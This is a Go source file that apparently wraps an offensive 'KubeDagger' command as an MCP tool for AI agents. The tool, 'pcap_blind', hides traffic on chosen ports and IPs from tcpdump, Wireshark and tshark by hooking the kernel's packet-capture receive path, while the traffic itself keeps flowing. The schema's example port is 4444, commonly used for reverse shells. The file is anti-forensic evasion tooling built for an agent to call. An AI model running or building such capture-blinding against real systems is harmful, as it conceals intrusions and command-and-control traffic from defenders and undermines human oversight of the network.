package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type PcapBlindInput struct {
	HidePorts string `json:"hide_ports,omitempty"`
	HideIPs   string `json:"hide_ips,omitempty"`
}

type PcapBlindTool struct {
	exec executor.Executor
}

func NewPcapBlind(exec executor.Executor) *PcapBlindTool {
	return &PcapBlindTool{exec: exec}
}

func (t *PcapBlindTool) Name() string { return "kubedagger_pcap_blind" }

func (t *PcapBlindTool) Description() string {
	return "Blind packet capture tools (tcpdump, Wireshark, tshark) by hooking the AF_PACKET socket receive path. Hides traffic on specified ports and IPs from network monitoring while allowing it to flow normally."
}

func (t *PcapBlindTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"hide_ports": {
				"type": "string",
				"description": "Comma-separated list of ports whose traffic is hidden (e.g. '4444,8080')"
			},
			"hide_ips": {
				"type": "string",
				"description": "Comma-separated list of IP addresses whose traffic is hidden"
			}
		}
	}`)
}

func (t *PcapBlindTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input PcapBlindInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.HidePorts, "hide_ports"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.HideIPs, "hide_ips"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"pcap-blind"}
	if input.HidePorts != "" {
		args = append(args, "--hide-ports", input.HidePorts)
	}
	if input.HideIPs != "" {
		args = append(args, "--hide-ips", input.HideIPs)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger pcap-blind failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger PCAP Blind\n\n")
	if output == "" {
		sb.WriteString("Capture blinding active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
